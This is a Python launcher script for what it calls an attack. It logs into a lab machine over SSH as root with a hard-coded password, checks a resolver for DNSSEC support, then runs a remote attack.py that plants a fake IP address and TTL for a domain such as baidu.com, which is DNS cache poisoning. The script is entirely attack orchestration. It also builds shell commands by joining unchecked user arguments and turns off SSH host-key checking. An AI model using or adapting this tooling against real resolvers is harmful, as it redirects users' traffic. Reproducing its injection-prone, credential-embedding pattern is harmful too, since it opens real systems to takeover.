import paramiko
import argparse

def secrun(domain, ip, fake_ip, fake_ttl):

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname='192.168.2.50',username='root',password='eve')
    print('detecting\n')
    ret = ''
    command = 'python3 /home/eve/dnssec_support.py ' + ip
    stdin, stdout, stderr = ssh.exec_command(command)
    ret += stdout.read().decode() + 'gqx'
    print(stdout.read())
    print('attacking\n')
    command = 'python3 /home/eve/attack.py ' + domain + ' ' + ip + ' ' + fake_ip + ' ' + fake_ttl + ' 192.168.2.52'
    stdin, stdout, stderr = ssh.exec_command(command)
    ret += stdout.read().decode()
    print(stdout.read())
    return ret


# secrun("baidu.com","192.168.50.3",'1.2.3.4',"100")
if __name__ == "__main__":

    parser = argparse.ArgumentParser()

    parser.add_argument('-d', '--attack_domain', type=str, required=False, default='baidu.com')
    parser.add_argument('-r', '--resolver_ip', type=str, required=False, default='192.168.50.3')
    parser.add_argument('-f', '--fake_ip', type=str, required=False, default='1.2.3.4')
    parser.add_argument('-t', '--fake_ttl', type=str, required=False, default='600')

    args = parser.parse_args()

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname='192.168.2.50',username='root',password='eve')
    print('detecting')
    command = 'python3 /home/eve/dnssec_support.py ' + args.resolver_ip
    stdin, stdout, stderr = ssh.exec_command(command)
    print(stdout.read())
    print('attacking')
    command = 'python3 /home/eve/attack.py ' + args.attack_domain + ' ' + args.resolver_ip + ' ' + args.fake_ip + ' ' + args.fake_ttl + ' 192.168.2.52'
    stdin, stdout, stderr = ssh.exec_command(command)
    print(stdout.read())